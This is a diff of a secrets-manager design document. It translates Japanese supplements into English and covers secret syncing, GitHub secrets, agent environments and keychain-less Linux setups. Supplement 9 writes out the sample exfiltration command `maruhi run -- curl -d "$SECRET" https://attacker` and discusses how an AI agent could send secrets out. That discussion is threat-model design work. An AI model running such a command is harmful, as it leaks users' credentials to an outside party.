+### Supplement 7: looking for a superset for push-time sync — round 3 (2026-09-04)
 
-補足 4 の残余は 3 つだった: (a) 書き手の機械から同期先へ届かないと最大 1 日の遅れ、(b) 同期先トークンを全 writer が持つ(role はプロジェクト単位)、(c) Vercel の Git 連携ではデプロイ前に同期先ストアに値がある必要がある。それぞれに上位互換が見つかった。
+Supplement 4 left three residuals: (a) if the destination cannot be reached from the writer's machine, up to a 1-day delay; (b) every writer holds the destination token (roles are per-project); (c) under Vercel's Git integration the destination store must hold the value before deploy. A superset was found for each.
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| P1. **書き手の CLI が CI を起動する(クライアント側の呼び鈴)** | `maruhi push` の直後に、書き手の機械の `gh`(ユーザー自身の GitHub 認証)で `gh workflow run maruhi-sync.yml` を叩く。通知はサーバーでなく書き手から出る | **◎ (a) と (b) を同時に解く**。同期先トークンは CI にだけ置け(書き手の機械には不要)、遅延は CI 起動分(数十秒)だけ。サーバー無関与・運営の資格ゼロ・仕様改訂ゼロ。`gh` がなければ直接同期(補足 4 N1)か定期突合へ退避 |
-| P2. **同期用の資格を別プロジェクトに置く** | maruhi のメンバーシップ単位はプロジェクトなので、`myapp-sync` のような別プロジェクトに同期先トークンと設定を置けば、同期できる人を絞れる(環境ではなくプロジェクトで分離) | **◎ (b) を仕様改訂ゼロで解く**。`maruhi sync` は設定で「資格の置き場 = プロジェクト X」を参照する。小チームは同一プロジェクトの `_sync` 環境でよく、分離したいチームだけ別プロジェクトにする |
-| P3. **デプロイ時再適用(sync を独立機構でなくデプロイ工程にする)** | CI からデプロイする対象(Cloudflare Workers / Fly / Railway CLI / AWS)は、デプロイの workflow 内で毎回 `maruhi ci run -- wrangler secret bulk` 等を実行し、同期先ストアを maruhi から作り直す | **◎ ドリフトが構造的に消える**(毎デプロイで正が上書き)。突合も通知も不要。対象は「CI がデプロイを握っている」プラットフォームに限る |
-| P4. Vercel / Netlify も CLI デプロイに切り替え、`vercel deploy -e KEY=…` でデプロイごとに値を注入 | プロジェクトの env ストアを使わない | ○ P3 を Vercel に広げられるが、Git 連携(プレビュー自動化)を捨てる大きな変更をユーザーに強いる。レシピとして提示するに留める |
-| P5. `sync verify` / `sync diff`(同期先を読み戻して maruhi と比較。値はメモリ内比較のみ) | ドリフトの検出 | ○ 定期突合の中身。「maruhi が正」で一方向上書き、同期先側の手編集は差分として報告 |
-| P6. 同期先の資格を短命化 | Vercel / Netlify のトークンは静的のみ。AWS / GCP は CI の OIDC → STS / WIF で静的トークン自体が不要 | ○ クラウドの秘密ストアへは CI 経由(OIDC)を推奨、PaaS へはトークン(§4 R2 のローテーション対象) |
+| P1. **The writer's CLI triggers CI (a client-side doorbell)** | Immediately after `maruhi push`, the writer's machine calls `gh workflow run maruhi-sync.yml` via `gh` (the user's own GitHub auth). The notification comes from the writer, not the server | **◎ solves (a) and (b) at once**. The destination token lives only in CI (not needed on the writer's machine); the delay is just the CI startup (tens of seconds). No server involvement, zero operator credentials, zero spec revision. Without `gh`, fall back to direct sync (supplement 4 N1) or periodic reconciliation |
+| P2. **Put the sync credential in a separate project** | Since maruhi's membership unit is the project, putting the destination token and config in a separate project like `myapp-sync` narrows who can sync (separation by project, not environment) | **◎ solves (b) with zero spec revision**. `maruhi sync` reads "where the credential lives = project X" from config. Small teams can use the same project's `_sync` environment; only teams wanting separation use a separate project |
+| P3. **Re-apply at deploy time (make sync part of the deploy step, not an independent mechanism)** | For targets deployed from CI (Cloudflare Workers / Fly / Railway CLI / AWS), run `maruhi ci run -- wrangler secret bulk` etc. inside the deploy workflow every time, rebuilding the destination store from maruhi | **◎ drift disappears structurally** (the source of truth overwrites on every deploy). No reconciliation or notification needed. Limited to platforms where "CI holds the deploy" |
+| P4. Switch Vercel / Netlify to CLI deploys too, injecting values per deploy with `vercel deploy -e KEY=…` | Does not use the project's env store | ○ extends P3 to Vercel, but forces a big change on users — abandoning Git integration (automatic previews). Only present as a recipe |
+| P5. `sync verify` / `sync diff` (read the destination back and compare with maruhi. Values compared in memory only) | Drift detection | ○ the content of periodic reconciliation. One-way overwrite with "maruhi is the source of truth"; hand edits on the destination side are reported as diffs |
+| P6. Make destination credentials short-lived | Vercel / Netlify tokens are static-only. For AWS / GCP, CI OIDC → STS / WIF removes the static token itself | ○ recommend CI-mediated (OIDC) for cloud secret stores; tokens for PaaS (the §4 R2 rotation target) |
 
-**第 3 ラウンドの結論**: 同期の経路は対象で 2 家族に分かれる。
-- **CI がデプロイを握る対象(Cloudflare Workers / Fly / Railway / AWS / GCP)**: デプロイ時再適用(P3)が最上位。通知も突合も要らない
-- **Git 連携で相手がデプロイする対象(Vercel / Netlify)**: push 時同期(N1)か、書き手の CLI からの CI 起動(P1)+ CI の同期。資格を書き手に持たせたくなければ P1 + P2
+**Round-3 conclusion**: sync paths split into two families by target.
+- **Targets where CI holds the deploy (Cloudflare Workers / Fly / Railway / AWS / GCP)**: re-apply at deploy time (P3) is top. Needs neither notification nor reconciliation
+- **Targets where the other side deploys via Git integration (Vercel / Netlify)**: push-time sync (N1), or CI triggered from the writer's CLI (P1) + CI sync. If you don't want writers to hold credentials, P1 + P2
 
-サーバー側の変更通知(S4 = SY6)が要る場面はさらに狭まり、「`gh` がなく、CI からしか同期せず、即時性が要る」の三重条件になる。降格の判断は不変。
+The situation needing server-side change notification (S4 = SY6) narrows further to the triple condition "no `gh`, syncs only from CI, and needs immediacy". The demotion ruling stands.
 
-### 補足 8: GitHub secrets 同期(gh 経路)の上位互換を探す — 第 3 ラウンド(2026-09-04)
+### Supplement 8: looking for a superset for GitHub secrets sync (the gh path) — round 3 (2026-09-04)
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| Q1. bootstrap の PAT を GitHub App トークンに置き換える | `actions/create-github-app-token` で App の秘密鍵から短命トークンを都度発行 | ○ 長期 PAT が消える(秘密鍵は残るがスコープ固定・回転可)。後から差し替え可能 |
-| Q2. **「GitHub secrets を空にする」を目標にする** | Actions はリース(`maruhi ci run`)で maruhi トークンすら GitHub secrets に置かない(OIDC + リポジトリアンカー〔非秘密〕)。残る GitHub secrets は「既製アクションの入力」「Dependabot」「reusable workflow の `secrets: inherit`」だけ | **◎ 位置づけ**。同期の目標は「GitHub secrets を増やす」でなく「減らす」。docs に "Your GitHub secrets can be empty" として書ける |
-| Q3. 既製アクションの入力は「ベンダー CLI を `maruhi ci run` で直接叩く」に置き換える案内 | `uses: vendor/deploy-action` + `with: api-key: ${{ secrets.X }}` を `maruhi ci run -- vendor deploy` に | ○ 多くの既製アクションは CLI の薄い皮。docs のパターン集 |
-| Q4. `$GITHUB_ENV` / `$GITHUB_OUTPUT` で後続ステップへ渡す | — | × ランナーのファイルに平文が書かれる。maruhi の機能としては作らない(ユーザーがシェルで書くのを止められはしないが、案内しない) |
-| Q5. ネイティブ封印(依存追加) | — | × 補足 5 のとおり不要 |
+| Q1. Replace bootstrap's PAT with a GitHub App token | Issue a short-lived token each time from the App's private key via `actions/create-github-app-token` | ○ the long-lived PAT disappears (the private key remains but is scope-fixed and rotatable). Can be swapped in later |
+| Q2. **Make "empty GitHub secrets" the goal** | With Actions on leases (`maruhi ci run`), even the maruhi token is not placed in GitHub secrets (OIDC + repository anchor〔non-secret〕). What remains in GitHub secrets is only "inputs to off-the-shelf actions", "Dependabot", and `secrets: inherit` for reusable workflows | **◎ the framing**. The goal of sync is not "grow GitHub secrets" but "shrink them". Docs can say "Your GitHub secrets can be empty" |
+| Q3. Guide replacing off-the-shelf action inputs with "invoke the vendor CLI directly via `maruhi ci run`" | Turn `uses: vendor/deploy-action` + `with: api-key: ${{ secrets.X }}` into `maruhi ci run -- vendor deploy` | ○ most off-the-shelf actions are thin wrappers over a CLI. A pattern collection in docs |
+| Q4. Pass to later steps via `$GITHUB_ENV` / `$GITHUB_OUTPUT` | — | × writes plaintext to a runner file. Not built as a maruhi feature (users writing it in shell cannot be stopped, but we do not guide them to) |
+| Q5. Native sealing (added dependency) | — | × unneeded per supplement 5 |
 
-**結論**: gh 経路が天井で、Q1 と Q2 / Q3 で「残る GitHub secrets を最小化する」方向へ寄せる。
+**Conclusion**: the gh path is the ceiling; steer toward minimizing "the GitHub secrets that remain" via Q1 and Q2 / Q3.
 
-**副産物の発見(ROADMAP 行き)**: Codespaces / devcontainer / WSL / 素の Linux サーバーは **OS キーチェーン不在クラス**で、現状の CLI は平文フォールバックを持たず(正しい)、`login` と鍵の保存が型付きエラーで止まる。`MARUHI_TOKEN` は CI のセッション解決専用で master 鍵の代替にはならない。Windows 実用対応(ROADMAP Phase 2)の WSL 案内と同根で、**「キーチェーン不在環境で人間が使う経路」**(候補: Secret Service の導入案内 / 端末セッション限定のメモリ保持 / パスキー PRF 封印 — device-key-sealing.md)を独立項目にする価値がある。対象層(Web 開発者)に devcontainer / Codespaces / WSL は多い。
+**Byproduct finding (to the ROADMAP)**: Codespaces / devcontainer / WSL / bare Linux servers are the **no-OS-keychain class**, and the current CLI has no plaintext fallback (correctly), so `login` and key storage stop with a typed error. `MARUHI_TOKEN` is only for CI session resolution and is not a substitute for the master key. Same root as the WSL guidance in practical Windows support (ROADMAP Phase 2), and worth making **"the path a human uses in a keychain-absent environment"** (candidates: a Secret Service install guide / device-session-scoped memory retention / passkey PRF sealing — device-key-sealing.md) its own item. devcontainer / Codespaces / WSL are common in the target audience (web developers).
 
-### 補足 9: エージェント環境の扱いの上位互換を探す — 第 3 ラウンド(2026-09-04)
+### Supplement 9: looking for a superset for agent-environment handling — round 3 (2026-09-04)
 
-補足 6 の A4(送信先を署名で縛る)を前提から疑う。
+Re-examine supplement 6's A4 (bind the destination by signature) from its premise.
 
-**決定的な事実**: `maruhi run` は**エージェント環境でも許可されている**(agent-gate の対象は値表示と儀式のみ。`run.ts` にエージェント判定はない)。エージェントは今日すでに `maruhi run -- curl -d "$SECRET" https://attacker` を実行できる。つまり「エージェントが送信先を選んで値を外へ送る」は同期で新たに生まれるリスクではなく、`run` を許可した時点で受け入れている(ADR-0016 決定 7 の目的は「値をエージェントの文脈〔stdout〕に出さない」ことと「儀式をエージェントにやらせない」ことで、悪意あるエージェントの持ち出し防止ではない。それは Phase 3 の brokering の領分)。
+**Decisive fact**: `maruhi run` is **already allowed in agent environments** (the agent gate covers only value display and ceremonies. `run.ts` has no agent check). An agent can already run `maruhi run -- curl -d "$SECRET" https://attacker` today. In other words, "an agent choosing a destination and sending values out" is not a new risk born by sync — it was accepted the moment `run` was allowed (the purpose of ADR-0016 decision 7 is "don't put values into the agent's context〔stdout〕" and "don't let agents run ceremonies", not preventing exfiltration by a malicious agent. That is Phase 3 brokering's territory).
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| B1. **`sync` は `run` と同じ信頼で扱う(専用ゲートを作らない)** | 値を stdout に出さない(これは必須)・監査行 `sync.executed`・環境ごとの autoSync 既定。自作プリセットは `run -- curl` と等価なので特別扱いしない | **◎ 銀の弾丸 = 「問題が新規に存在しないことの確認」**。A4 の儀式・署名済み設定・エージェント検出は同期の安全性に寄与しない(既存の `run` で迂回できる) |
-| B2. 自作プリセットの**作成**だけ TTY を課す(誤操作ガード) | 誤って壊れた送信先を登録しない | ○ 安価。ADR-0016 改訂 1・4 項 (c) の「TTY は誤操作ガード」の位置づけと整合 |
-| B3. 同期設定を maruhi の変数(E2EE + 署名)に置く | — | ○ **チーム内の一貫性のため**(全員が同じ設定を使う・設定も履歴に残る)。エージェント防御としてではない。P2(別プロジェクト)と組む |
-| B4. A4 の儀式ゲート(2 層 fail-closed) | — | △ 防御効果が `run` で無効化される。コストだけ残る。**採らない** |
-| B5. 既知エージェント検出で `sync` を deny | — | △ 同上。ただし「エージェントが本番へ勝手に同期する」誤操作ガードとしてなら autoSync の既定(production = 手動)で足りる |
-| B6. Phase 3 brokering との接続 | `proxy run` 配下で動くエージェントは値そのものを持たないので、`sync` も同期先へは「プロキシが実値を挿す」形になる | ○ 将来。エージェント環境での持ち出し防止はここで扱う(ADR-0014 決定 2 ②) |
+| B1. **Treat `sync` with the same trust as `run` (build no dedicated gate)** | Don't put values on stdout (mandatory) + audit line `sync.executed` + per-environment autoSync default. Homemade presets get no special treatment since they're equivalent to `run -- curl` | **◎ the silver bullet = "confirming the problem does not newly exist"**. A4's ceremony, signed config, and agent detection contribute nothing to sync safety (bypassable via existing `run`) |
+| B2. Require TTY only for **creating** a homemade preset (mistake guard) | Don't accidentally register a broken destination | ○ cheap. Consistent with the "TTY is a mistake guard" framing of ADR-0016 revision 1, item 4 (c) |
+| B3. Store the sync configuration as maruhi variables (E2EE + signatures) | — | ○ **for in-team consistency** (everyone uses the same config; the config itself lands in history). Not as agent defense. Pairs with P2 (separate project) |
+| B4. A4's ceremony gate (2-layer fail-closed) | — | △ its defensive effect is voided by `run`. Only the cost remains. **Not adopted** |
+| B5. Deny `sync` on known-agent detection | — | △ same as above. Though as a "agent syncs to production on its own" mistake guard, the autoSync default (production = manual) suffices |
+| B6. Connection to Phase 3 brokering | An agent running under `proxy run` doesn't hold the values themselves, so `sync` also becomes "the proxy inserts the real values toward the destination" | ○ future. Exfiltration prevention in agent environments is handled here (ADR-0014 decision 2 ②) |
 
-**結論**: **B1 + B2 + B3**。前回の A4(署名で送信先を縛る)は撤回し、SY2 の概算を 5〜8 日に戻す。「エージェント環境での同期」は `run` と同じ扱いにし、脅威モデル文書には「エージェントが `run` / `sync` を通じて値を持ち出せることは v1 の非保証(brokering で扱う)」と明記する。
+**Conclusion**: **B1 + B2 + B3**. Retract the previous A4 (binding the destination by signature) and restore SY2's estimate to 5–8 days. Treat "sync in agent environments" the same as `run`, and state in the threat model document that "an agent being able to exfiltrate values via `run` / `sync` is a v1 non-guarantee (handled by brokering)".
 
-**3 ラウンドを通した同期の全体像(改訂)**: **同期先は built-in プリセット(ホスト固定)+ ユーザー所有のトークン。値を変えた人の CLI が直接同期するか CI を起動し、CI がデプロイのたびに再適用し、監査に残る。** サーバーは何も持たず、通知も、エージェント専用のゲートも要らない。
+**The whole picture of sync across all 3 rounds (revised)**: **sync destinations are built-in presets (fixed hosts) + user-owned tokens. The CLI of the person who changed the value syncs directly or triggers CI; CI re-applies on every deploy; it lands in the audit.** The server holds nothing, and needs neither notification nor an agent-specific gate.
 
-### 補足 10: 同期の第 4 ラウンド — 「同期先 = ベンダー CLI のドライバ」(2026-09-04)
+### Supplement 10: sync round 4 — "sync destination = a driver over the vendor CLI" (2026-09-04)
 
-補足 5 の gh 経路(`printenv X | gh secret set X`)を一般化すると、同期の作り方そのものが変わる。
+Generalizing supplement 5's gh path (`printenv X | gh secret set X`) changes how sync itself is built.
 
-**観察**: 主要な同期先はどれも公式 CLI を持ち、stdin から値を受け取れる — `vercel env add NAME production`(stdin)、`wrangler secret bulk`(stdin の JSON)、`gh secret set NAME`(stdin)、`flyctl secrets set`(引数だが `--stage`)、`railway variables set`、`netlify env:set`(引数 — 後述)。maruhi 自身も `push` を stdin 方式にしている。
+**Observation**: every major sync destination has an official CLI that accepts values over stdin — `vercel env add NAME production` (stdin), `wrangler secret bulk` (JSON on stdin), `gh secret set NAME` (stdin), `flyctl secrets set` (arguments, but `--stage`), `railway variables set`, `netlify env:set` (arguments — see below). maruhi itself made `push` stdin-based.
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| V1. **`maruhi sync <target>` = ベンダー CLI を stdin 経由で駆動するドライバ** | HTTP アダプタ・プリセット・同期先トークンの保管を持たず、`maruhi run` の変種としてベンダー CLI に値を流し込む(`maruhi sync vercel` ≒ 変数ごとに `maruhi run --only VAR -- vercel env add VAR production` を回す)。認証はベンダー CLI 自身のログイン(手元)か、CI ではベンダーのトークン環境変数(`VERCEL_TOKEN` / `CLOUDFLARE_API_TOKEN` 等)を `maruhi ci run` が maruhi の変数から注入 | **◎ 第 4 ラウンドの上位互換**。(1) 同期先トークンを maruhi に保管する必要が消える(手元はベンダー CLI の認証を使う)。(2) HTTP API の upsert / ページング / 環境の対応付けの癖をベンダーが保守する。(3) 自作プリセット(任意 URL)という概念が消え、「任意のコマンド」= `run` と同じ扱いに自然に収まる(補足 9 と整合)。(4) SY5 の gh 経路と同じ形になり、GitHub は特別扱いでなくなる。(5) デプロイ時再適用(補足 7 P3)はこのドライバをデプロイ workflow で呼ぶだけ |
-| V2. HTTP アダプタ + プリセット(補足 1 の S8) | — | ○ **ベンダー CLI が stdin を受けない・引数に値を要求する先の退避経路**(Netlify の `env:set KEY value` は値が引数に出るため `ps` で見える — HTTP API を使う)。Railway は GraphQL、Fly は `flyctl secrets import`(stdin の KEY=VALUE)で V1 可 |
-| V3. ベンダー CLI の有無・版の検出と `npx` / `bunx` での固定 | ドライバの前提確認 | ○ V1 の付帯。CLI 不在なら V2 へ退避、または案内 |
-| V4. `sync diff` はベンダー CLI の一覧(`vercel env ls` 等)と突合 | 値は取得しない(名前と更新時刻のみ)。値の一致確認が要る先は HTTP で読み戻す | ○ |
+| V1. **`maruhi sync <target>` = a driver that drives the vendor CLI over stdin** | Holds no HTTP adapter, no presets, no destination-token storage; as a variant of `maruhi run` it pipes values into the vendor CLI (`maruhi sync vercel` ≈ looping `maruhi run --only VAR -- vercel env add VAR production` per variable). Auth is the vendor CLI's own login (locally) or, in CI, the vendor's token env var (`VERCEL_TOKEN` / `CLOUDFLARE_API_TOKEN` etc.) injected by `maruhi ci run` from maruhi variables | **◎ round-4 superset**. (1) No need to store destination tokens in maruhi (locally, the vendor CLI's auth is used). (2) The vendor maintains the HTTP API's upsert / paging / environment-mapping quirks. (3) The concept of "homemade preset (arbitrary URL)" disappears, and "arbitrary command" lands naturally as the same treatment as `run` (consistent with supplement 9). (4) Same shape as SY5's gh path — GitHub is no longer special-cased. (5) Re-apply at deploy time (supplement 7 P3) is just calling this driver in the deploy workflow |
+| V2. HTTP adapter + presets (supplement 1's S8) | — | ○ **the fallback path for destinations whose vendor CLI doesn't accept stdin or demands the value as an argument** (Netlify's `env:set KEY value` puts the value in argv — visible via `ps`, so use the HTTP API). Railway is GraphQL; Fly works via `flyctl secrets import` (stdin KEY=VALUE), so V1 applies |
+| V3. Detect vendor CLI presence / version and pin via `npx` / `bunx` | Driver prerequisites | ○ an accessory of V1. If the CLI is absent, fall back to V2 or guide |
+| V4. `sync diff` reconciles against the vendor CLI's listing (`vercel env ls` etc.) | Doesn't fetch values (names and update times only). Destinations needing value-identity checks are read back over HTTP | ○ |
 
-**V1 の含意**: SY2 のコストは HTTP アダプタ分が減り、ドライバ 1 つあたり 0.5 日程度になる(引数の引用・Windows のシェル差・stdin の改行規則は共通部品)。「同期先トークンをどこに置くか」(補足 4 の残余 (b)・補足 7 P2)は**手元では問題自体が消え**(ベンダー CLI の認証)、CI ではベンダートークンを maruhi の変数として `ci run` で注入する 1 経路に統一される。
+**What V1 implies**: SY2's cost loses the HTTP-adapter portion, down to ~0.5 days per driver (argument quoting, Windows shell differences, and stdin newline rules are shared parts). "Where to put the destination token" (supplement 4 residual (b), supplement 7 P2) **disappears as a problem locally** (the vendor CLI's auth) and unifies in CI to a single path: vendor tokens as maruhi variables injected via `ci run`.
 
-**残る V2 対象**: Netlify(値が引数)、AWS SM / GCP SM(`aws secretsmanager put-secret-value --secret-string file:///dev/stdin` は可能だが AWS CLI の導入が重い — CI では OIDC + AWS CLI が普通なので V1 で足りる)。
+**Remaining V2 targets**: Netlify (value in argv), AWS SM / GCP SM (`aws secretsmanager put-secret-value --secret-string file:///dev/stdin` is possible but installing the AWS CLI is heavy — in CI, OIDC + AWS CLI is normal anyway, so V1 suffices).
 
-### 補足 11: GitHub secrets の第 4 ラウンド(2026-09-04)
+### Supplement 11: GitHub secrets round 4 (2026-09-04)
 
-補足 10 により GitHub は「gh をドライバとする同期先の 1 つ」になり、特別扱いが消えた。新規の上位互換はない。残る改善は Q1(App トークン)と Q2 / Q3(GitHub secrets を空にする案内)のまま。
+Per supplement 10, GitHub becomes "one of the sync destinations driven by gh" and the special-casing disappears. No new superset. The remaining improvements stay as Q1 (App token) and Q2 / Q3 (guidance for emptying GitHub secrets).
 
-### 補足 12: キーチェーン不在環境(Codespaces / devcontainer / WSL / 素の Linux)— 案の列挙(2026-09-04)
+### Supplement 12: keychain-absent environments (Codespaces / devcontainer / WSL / bare Linux) — option enumeration (2026-09-04)
 
-**問題の本質**: CLI が永続化してよい秘密は OS キーチェーンの中だけ(CLAUDE.md)。キーチェーンがない環境では `login` と鍵の保存が型付きエラーで止まる。これは Windows とは別問題で、**対象層(Web 開発者)の devcontainer / Codespaces / WSL 利用者を丸ごと除外**している。加えて ephemeral な環境(コンテナ再作成)では「新しい端末 = 新しい鍵」になり、毎回メンバー追加か復元が要る。
+**The essence of the problem**: the only secret the CLI may persist is inside the OS keychain (CLAUDE.md). In environments without a keychain, `login` and key storage stop with a typed error. This is a separate problem from Windows, and it **excludes the entire devcontainer / Codespaces / WSL user base of the target audience (web developers)**. On top of that, in ephemeral environments (container rebuild) it becomes "new device = new key", requiring a member add or recovery every time.
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| L1. Secret Service の導入レシピ(gnome-keyring + D-Bus。WSL2 は systemd 対応で可、devcontainer は feature 化) | docs のみ | ○ **即日の退避経路**。ephemeral 環境ではキーリングごと消えるので volume 永続化の案内が要る。「動くが不格好」 |
-| L2. **セッション内メモリ保持(`maruhi agent` — ssh-agent 型)** | 常駐プロセスがトークンと master 鍵をメモリに持ち、CLI は unix ソケット越しに使う。ディスクに何も書かない | ○ 不変条件を破らない。コンテナ再起動で消えるため L3 / L4 と組む |
-| L3. **既存のリカバリーラップで同一鍵を復元(`key recover`)** | CRYPTO_SPEC §8 のラップは既にサーバーにある。新環境では `login` → `key recover`(リカバリーコード入力)で**同じ鍵**が戻る = メンバー再追加が不要 | ○ **仕様変更ゼロで今日できる**。ただしリカバリーコードを日常的に端末へ打つのは用途外(取得のレート制限 1 時間 5 回・エージェント環境での儀式拒否)。一時しのぎ |
-| L4. **「封印バックアップ」を §8 の第 2 経路として一般化** | master 鍵をもう 1 つの KEK でラップしてサーバーに置く(構造は §8 と同じ・AAD で用途分離)。KEK の元は (a) パスフレーズ、(b) パスキー PRF。`login` の直後に取得 → 復号 → L2 のメモリへ | **◎ 本命**。ROADMAP「将来」のリカバリー封印バックアップ・パスキー PRF と同じ機構であり、キーチェーン不在問題が着手の理由を与える。端末移行の儀式(ADR-0014 決定 5 の「初回と招待だけ」の 1 つ)も同時に軽くなる |
-| L4-a. パスフレーズ由来 KEK | 低エントロピー → ストレッチング必須。§8 は「パスフレーズ由来の鍵を導入する場合は Argon2id 必須(仕様改訂)」と明記。Argon2id は WebCrypto にない(PBKDF2 はある) | △ **規律との衝突が 2 つ**(§8 の Argon2id 要件 vs WebCrypto のみ)。PBKDF2-SHA256 高反復で §8 を改訂するか、Argon2id の依存(hash-wasm / noble)を例外承認するかの裁定が要る |
-| L4-b. **パスキー PRF 由来 KEK** | WebAuthn PRF 拡張の出力は一様ランダムな高エントロピー秘密 → **リカバリーコードと同じく HKDF(salt 空)で足り、ストレッチング不要**。§8 の構造をそのまま流用できる | **◎ 暗号面では最も素直**。課題は UX 面: PRF は**ブラウザでしか取れない**ため、CLI が遠隔(Codespaces)のときは PRF 出力を CLI へ運ぶ経路が要る |
-| L4-b の経路 (i): 運営配信の Web ページで PRF → CLI の一時公開鍵へ HPKE 封印 → サーバーが暗号文を中継 | — | △ Web に「封印コード」が載る = ADR-0018(hosted Web は鍵・ラップのコードパスを持たない)と衝突。CLI 承認ページは `script-src 'none'` で WebAuthn 自体が動かない |
-| L4-b の経路 (ii): **CLI が配る localhost ページ(MIT 側・`maruhi ui` と同じ配布物)で PRF を取る** | Codespaces / VS Code は localhost をローカルブラウザへポート転送する。WSL は localhost がそのまま通る | ○ ADR-0018 と整合(CLI 配布物の中で完結)。`maruhi ui` 第 2 段の枠組み(UI と鍵保持プロセスの操作別契約)に「PRF を取って渡す」儀式型操作を 1 つ足す形 |
-| L5. WSL から Windows の Credential Manager を interop で使う | — | △ ハック。L1 の WSL2 + systemd + gnome-keyring のほうが素直 |
-| L6. キーチェーン不在では `MARUHI_TOKEN` + 鍵なしクラスの操作のみ許可 | `schema` 系・メタのみ pull など | ○ 既にそう動く。値の操作ができないので解決ではない |
+| L1. Secret Service install recipe (gnome-keyring + D-Bus. WSL2 works via systemd support, devcontainer as a feature) | docs only | ○ **a same-day escape path**. In ephemeral environments the keyring disappears with it, so volume-persistence guidance is needed. "Works but inelegant" |
+| L2. **In-session memory retention (`maruhi agent` — ssh-agent type)** | A resident process holds the token and master key in memory; the CLI uses it over a unix socket. Writes nothing to disk | ○ does not break the invariant. Disappears on container restart, so pair with L3 / L4 |
+| L3. **Restore the same key with the existing recovery wrap (`key recover`)** | The CRYPTO_SPEC §8 wrap is already on the server. In a new environment `login` → `key recover` (enter the recovery code) returns **the same key** = no member re-add needed | ○ **possible today with zero spec change**. But typing a recovery code into a terminal daily is off-label (fetch rate limit 5 per hour, ceremony refused in agent environments). A stopgap |
+| L4. **Generalize "sealed backup" as a second §8 path** | Wrap the master key under another KEK and place it on the server (same structure as §8, usage separated by AAD). KEK sources: (a) passphrase, (b) passkey PRF. Right after `login`: fetch → decrypt → into L2's memory | **◎ the leading candidate**. Same mechanism as ROADMAP "future" recovery sealed-backup / passkey PRF, and the keychain-absent problem gives a reason to start it. The device-migration ceremony (one of ADR-0014 decision 5's "first-time and invite only") also gets lighter at the same time |
+| L4-a. Passphrase-derived KEK | Low entropy → stretching mandatory. §8 explicitly says "introducing a passphrase-derived key requires Argon2id (spec revision)". Argon2id is not in WebCrypto (PBKDF2 is) | △ **two discipline collisions** (§8's Argon2id requirement vs WebCrypto-only). Needs a ruling on revising §8 to high-iteration PBKDF2-SHA256 or exception-approving an Argon2id dependency (hash-wasm / noble) |
+| L4-b. **Passkey-PRF-derived KEK** | The WebAuthn PRF extension's output is a uniformly random high-entropy secret → **HKDF (empty salt) suffices, like the recovery code; no stretching needed**. §8's structure can be reused as-is | **◎ the cleanest on the crypto side**. The problem is UX: PRF **can only be obtained in a browser**, so when the CLI is remote (Codespaces) a path is needed to carry the PRF output to the CLI |
+| L4-b path (i): take the PRF on an operator-hosted web page → HPKE-seal to the CLI's temporary public key → the server relays the ciphertext | — | △ puts "sealing code" on the web = collides with ADR-0018 (hosted web holds no key / wrap code paths). The CLI approval page can't run WebAuthn at all under `script-src 'none'` |
+| L4-b path (ii): **take the PRF on a localhost page served by the CLI (MIT-licensed side, same distribution as `maruhi ui`)** | Codespaces / VS Code port-forward localhost to the local browser. WSL passes localhost straight through | ○ consistent with ADR-0018 (self-contained inside the CLI distribution). The shape of adding one "fetch the PRF and pass it" ceremony-type operation to `maruhi ui` stage 2's framework (per-operation contracts between the UI and the key-holding process) |
+| L5. Use Windows Credential Manager from WSL via interop | — | △ a hack. L1's WSL2 + systemd + gnome-keyring is cleaner |
+| L6. In keychain-absent environments, allow `MARUHI_TOKEN` + keyless-class operations only | `schema` family, metadata-only pull, etc. | ○ already works that way. Not a solution since value operations are impossible |
 
-**結論(推奨)**: 順序は **L1(即日・docs)→ L2 + L3(仕様変更ゼロの実用経路)→ L4-b(本命。設計セッション → CRYPTO_SPEC §8 改訂 → 実装)**。L4-a(パスフレーズ)は規律衝突が 2 つあるので、L4-b で足りるなら採らない。L4 は「キーチェーン不在」「端末移行」「リカバリー UX」「パスキー PRF(将来項)」を 1 つの機構で解くため、**設計セッションは招待制ベータ前に置く価値がある**(実装がベータ後になっても、設計が決まっていれば L2 + L3 の暫定経路を正しい方向に置ける)。
+**Conclusion (recommendation)**: order is **L1 (same-day, docs) → L2 + L3 (zero-spec-change practical path) → L4-b (leading candidate; design session → CRYPTO_SPEC §8 revision → implementation)**. L4-a (passphrase) has two discipline collisions, so don't take it if L4-b suffices. Since L4 solves "keychain-absent", "device migration", "recovery UX", and "passkey PRF (future item)" with one mechanism, **the design session is worth placing before the invite-only beta** (even if implementation lands after beta, once the design is set the L2 + L3 interim path can be placed in the right direction).
 
-**L1 = KL1 実装録(2026-09-11 — PR #163)**: 公開 docs の新ページ `/docs/linux-keychain`(`apps/site/docs/linux-keychain.mdx`。getting-started から導線 2 本・索引カードは 4 枚のまま)。レシピは Ubuntu 24.04 + Bun 1.4.0 の実機で検証してから書いた(SY1 の前例):
-(1) D-Bus セッション不在では `Bun.secrets.set` が**無期限ブロック**(10 分放置でも返らない)— `live.ts` の `KEYCHAIN_TIMEOUT`(30 秒)のコメントにある実測の再現。バスがあって Secret Service 不在なら即時失敗(`keychainUnavailable`)。
-(2) `apt-get install gnome-keyring dbus-user-session libsecret-1-0` → `dbus-run-session -- bash` 内で `printf '%s' "$pw" | gnome-keyring-daemon --unlock --components=secrets` → `Bun.secrets` の set / get / delete が動作。
-(3) 永続性: 別の dbus セッションで unlock し直すと前セッションの保存値が読める。実体は `~/.local/share/keyrings/login.keyring`(AES・入力パスワードで暗号化)。デーモンはセッション単位・データは永続 — ephemeral コンテナへの助言は「このディレクトリを volume 永続化 or 再構築ごとに `key recover`」の 2 択で書いた。
-(4) **空パスワードは不可**: キーリングを作らず GUI プロンプタ(Gcr)の起動を試みてハング → 30 秒ガードで timeout。レシピは非空パスワード必須と明記(「空パスワード = 平文キーリング」の古典的警告はこの経路では発生し得ないため書かない)。
-docs に書いたのは検証事実と既存コードの実文言のみ(systemd 経路など未検証の主張は書かない — `dbus-run-session` は systemd 不要で WSL / コンテナでもそのまま通る)。
